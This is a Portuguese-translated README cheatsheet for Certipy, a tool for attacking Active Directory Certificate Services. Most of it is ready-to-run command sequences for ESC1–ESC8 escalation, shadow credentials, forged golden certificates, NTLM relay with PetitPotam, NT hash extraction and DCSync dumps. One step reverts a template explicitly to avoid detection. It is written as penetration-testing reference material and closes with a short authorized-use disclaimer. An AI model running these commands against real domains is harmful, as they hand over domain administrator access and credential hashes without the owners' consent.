<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p alinhar="centro">
  <b>🔑 Ferramenta abrangente para enumerar e explorar configurações incorretas dos Serviços de Certificados do Active Directory (AD CS)</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Por que abuso de AD CS?](#-why-ad-cs-abuse)
- [Instalação](#-instalação)
- [Visão geral dos subcomandos do Certipy](#-certipy-subcommands-overview)
- [Enumeração e descoberta (`find`)](#-enumeração--descoberta-encontrar)
- [A Matriz de Vulnerabilidade ESC](#-the-esc-vulnerability-matrix)
  - [ESC1: Nome alternativo do assunto de suprimentos do inscrito (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: EKU ou SubCA para qualquer finalidade](#esc2-any-purpose-eku-or-subca)
  - [ESC3: Agente de solicitação de certificado](#esc3-certificate-request-agent)
  - [ESC4: Controle de acesso de modelo vulnerável (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado](#esc6-editf_attributesubjectaltname2 habilitado)
  - [ESC7: Controle de acesso de CA vulnerável](#esc7-vulnerable-ca-access-control)
  - [ESC8: Retransmissão NTLM para inscrição na Web HTTP](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 e ESC10: Falhas fortes no mapeamento de certificados](#esc9--esc10-strong-certificate-mapping-flaws)
- [Credenciais de sombra (`shadow`)](#-shadow-credentials-shadow)
- [Certificados Dourados (`forge`)](#-golden-certificates-forge)
- [Autenticando com PFX (`auth`)](#-autenticando-com-pfx-auth)
- [Fluxos de trabalho de ataque no mundo real](#-fluxos de trabalho de ataque no mundo real)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Dicas e práticas recomendadas](#-dicas--melhores práticas)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**Certipy** (criado por Oliver Lyak) é a principal ferramenta baseada em Python para enumerar e explorar os Serviços de Certificados do Active Directory (**AD CS**). AD CS é a implementação de infraestrutura de chave pública (PKI) da Microsoft para redes corporativas do Active Directory, amplamente usada para logon de cartão inteligente, VPNs, S/MIME e criptografia TLS interna.

Como as configurações incorretas de certificados frequentemente permitem que usuários de domínio sem privilégios solicitem certificados como administradores de domínio ou controladores de domínio, o abuso de AD CS representa um dos vetores de escalonamento de domínio mais confiáveis ​​e impactantes nos testes de penetração empresariais modernos.

---

## ⚖️ Por que abuso de AD CS?

- ⚡ **Escalonamento instantâneo de domínio:** Modelos de certificado mal configurados geralmente comprometem todo o domínio em segundos.
- 🔑 **Furtivo e Persistente:** Certificados roubados ou Certificados Dourados falsificados podem permanecer válidos por anos sem acionar alertas padrão de alteração de senha.
- 🔄 **PKINIT para Hash NT:** Certipy autentica certificados `.pfx` solicitados sobre Kerberos PKINIT, recuperando o hash NT de texto simples do destino diretamente do KDC.

---

## 📥 Instalação

### Usando pipx (recomendado)
```bash
pipx install certipy-ad
```
### Do repositório GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Verificação
```bash
certipy -h
```
---

## 🧭 Visão geral dos subcomandos Certipy

| Subcomando | Função |
|------------|----------|
| `find` | Enumerar CAs, modelos e detectar vulnerabilidades ESC |
| `req` | Solicitar certificados de modelos vulneráveis ​​|
| `auth` | Autentique usando certificados `.pfx` para recuperar hash TGT e NT |
| `ca` | Enumerar e modificar definições de configuração da CA |
| `template` | Modifique as configurações do modelo de certificado (útil em ESC4) |
| `account` | Gerenciar contas de computador do Active Directory (MachineAccountQuota) |
| `shadow` | Explorar credenciais de sombra (`msDS-KeyCredentialLink`) |
| `forge` | Forjar Certificados Dourados usando uma chave privada de CA roubada |

---

## 🔍 Enumeração e descoberta (`find`)

Comece identificando a Autoridade de Certificação Corporativa (CA) e verificando modelos vulneráveis:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 A Matriz de Vulnerabilidade ESC

### ESC1: O inscrito fornece o nome alternativo do assunto (SAN)

**Condição:**
- Usuários com poucos privilégios têm direitos de inscrição (`Client Authentication` EKU habilitado).
- O modelo especifica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (permite que o solicitante especifique qualquer Nome Alternativo do Assunto, como o Administrador do Domínio).

**Exploração:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*A saída produz TGT do administrador e texto simples NT Hash!*

---

### ESC2: EKU ou SubCA para qualquer finalidade

**Condição:**
- O modelo especifica `Any Purpose` EKU ou não tem EKU definido.
- Pode ser usado para qualquer finalidade, inclusive autenticação de cliente.

**Exploração:**
Explorado de forma idêntica ao ESC1 ou usado em combinação com ESC3 para obter um certificado de agente de inscrição.

---

### ESC3: Agente de solicitação de certificado

**Condição:**
- O modelo possui o EKU (Agente de Inscrição) `Certificate Request Agent`.
- Permite solicitar certificados em nome de outro usuário em modelos secundários.

**Exploração:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Controle de acesso de modelo vulnerável (ACL)

**Condição:**
- O usuário de baixo privilégio tem direitos `WriteOwner`, `WriteDacl` ou `WriteProperty` sobre um modelo de certificado.

**Exploração:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 ativado

**Condição:**
- A CA possui o sinalizador `EDITF_ATTRIBUTESUBJECTALTNAME2` definido, permitindo que qualquer solicitação de certificado especifique SANs arbitrários, independentemente das configurações do modelo!

**Exploração:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Controle de acesso de CA vulnerável

**Condição:**
- O usuário possui direitos `ManageCA` ou `ManageCertificates` na própria CA.

**Exploração:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: Retransmissão NTLM para inscrição na Web HTTP

**Condição:**
- A CA possui o endpoint HTTP de registro na Web (`/certsrv/`) habilitado com autenticação NTLM sem EPA (Proteção Estendida para Autenticação) e HTTPS.

**Fluxo de trabalho de exploração:**
1. Inicie o `ntlmrelayx` apontando para CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Acione a autenticação forçada da máquina via PetitPotam ou PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` retransmite a autenticação NTLM da conta da máquina do DC, solicita um certificado de computador e gera base64 `.pfx`.
4. Autentique-se como controlador de domínio usando Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Use o hash NT do DC para executar um despejo DCSync completo com `impacket-secretsdump`.

---

## 👥 Credenciais Shadow (`shadow`)

Se uma conta comprometida tiver acesso de gravação ao atributo `msDS-KeyCredentialLink` de outra conta:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Certificados Dourados (`forge`)

Se você comprometeu a CA e extraiu sua chave privada:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Autenticando com PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Fluxos de trabalho de ataque no mundo real

### Conclua o controle do domínio ESC1 em 3 comandos
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Tabela de referência rápida

| Tarefa | Comando |
|------|---------|
| **Enumerar AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Solicitar certificado (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Autenticar PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Modificar modelo (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Credenciais Shadow** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Gerenciar direitos da CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forjar Certificado Dourado** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Dicas e práticas recomendadas

1. **Verifique a sincronização do relógio DC:**
   Kerberos PKINIT requer que a hora do sistema seja sincronizada dentro de 5 minutos do Controlador de Domínio. Correr:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Manipular KDC_ERR_PADATA_TYPE_NOSUPP:**
   Se `certipy auth` falhar com esse erro, o controlador de domínio não possui um certificado de controlador de domínio válido instalado para PKINIT. Neste caso, use autenticação LDAP ou SChannel.
3. **Sempre limpe modelos ESC4:**
   Ao alterar modelos de certificados, sempre retenha e reaplique a configuração de backup (`-configuration <FILE>.json`) para evitar deixar o ambiente vulnerável ou causar interrupções operacionais.

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** Os ataques aos Serviços de Certificados do Active Directory concedem acesso administrativo crítico e de alto impacto em redes de domínio. O Certipy só deve ser executado durante testes de penetração autorizados, exercícios de equipe vermelha e auditorias de segurança ética com permissão por escrito.

---

## 📚 Recursos

- [Repositório oficial do GitHub Certipy](https://github.com/ly4k/Certipy)
- [Whitepaper de usados certificados (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Caminhos e proteções de ataque AD CS (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)